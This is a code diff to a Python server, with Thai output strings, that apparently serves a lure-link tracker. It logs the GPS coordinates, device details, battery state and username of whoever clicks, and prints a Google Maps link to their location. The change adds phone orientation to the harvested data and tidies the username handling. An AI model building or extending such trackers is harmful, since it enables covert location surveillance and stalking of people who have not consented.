@@ -94,7 +94,11 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
                 status = "⚡ กำลังชาร์จ" if battery_info.get('charging') else "🔋 ไม่ได้ชาร์จ"
                 bat_text = f"{battery_info.get('level', 0)}% ({status})"
 
-            username = data.get('username', 'ไม่ระบุ')
+            username = data.get('username', '').strip()
+            if not username:
+                username = 'ไม่ระบุ (ไม่ได้กรอก)'
+            
+            orientation = device_info.get('orientation', 'ไม่ทราบ (ไม่มีเซ็นเซอร์หรือไม่อนุญาต)')
             
             print('\n========================================')
             print('🚨 มีคนกดลิ้งค์และส่งข้อมูลมาแล้ว! 🚨')
@@ -111,6 +115,7 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             print(f'🖥️ ขนาดหน้าจอ: {device_info.get("screen", "N/A")}')
             print(f'🚀 CPU Cores: {device_info.get("cores", "N/A")} | RAM: {device_info.get("ram", "N/A")} GB')
             print(f'🔋 แบตเตอรี่: {bat_text}')
+            print(f'🧭 ท่าทางมือถือ: {orientation}')
             print(f'🗺️ ลิ้งค์ Google Maps เพื่อดูแผนที่:')
             print(f'https://www.google.com/maps?q={lat},{lon}')
             
@@ -126,6 +131,7 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
                 f"📍 พิกัด GPS: {lat}, {lon}\n"
                 f"📱 อุปกรณ์: {device_info.get('platform', 'N/A')}\n"
                 f"🔋 แบตเตอรี่: {bat_text}\n"
+                f"🧭 ท่าทาง: {orientation}\n"
                 f"🚀 CPU: {device_info.get('cores', 'N/A')} cores\n\n"
                 f"🌐 Google Maps:\nhttps://www.google.com/maps?q={lat},{lon}"
             )
